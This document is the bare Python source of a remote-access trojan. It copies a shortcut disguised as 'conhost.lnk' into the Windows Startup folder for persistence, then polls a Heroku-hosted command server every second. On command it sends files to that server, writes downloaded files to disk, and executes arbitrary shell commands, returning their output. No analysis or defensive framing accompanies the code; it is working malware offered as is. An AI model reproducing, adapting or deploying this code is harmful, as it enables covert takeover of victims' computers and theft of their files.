from requests import get, post
from os import getlogin
from secrets import token_hex
from threading import Timer
from subprocess import Popen, PIPE

Popen('copy "./conhost.lnk" "C:/Users/' + getlogin() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"', shell=True)

def set_interval(func, sec):
  def func_wrapper():
    set_interval(func, sec)
    func()
  t = Timer(sec, func_wrapper)
  t.start()
  return t

url = 'https://data-leaf.herokuapp.com'

username = getlogin() + '.' + token_hex(4)

def request_command():
  command = get(url + '/get/' + username).text.split(' ')
  data = 'initial'
  if command[0] == 'none':
    return
  elif command[0] == 'readfile':
    f = open(command[1], 'rb')
    post(url + '/file/', data=f)
  elif command[0] == 'writefile':
    f = open(command[1], 'wb')
    data = get(url + '/download')
    f.write(data.content)
    f.close()
  elif command[0] == 'execute':
    command.pop(0)
    command = ' '.join(command)
    stream = Popen(command, stdout=PIPE, stderr=PIPE, shell=True, cwd='/')
    data = stream.communicate()[0]
    stream.kill()
  else:
    data = 'no valid command specified'
  post(url + '/data/' + username, data=data)

set_interval(request_command, 1)
request_command()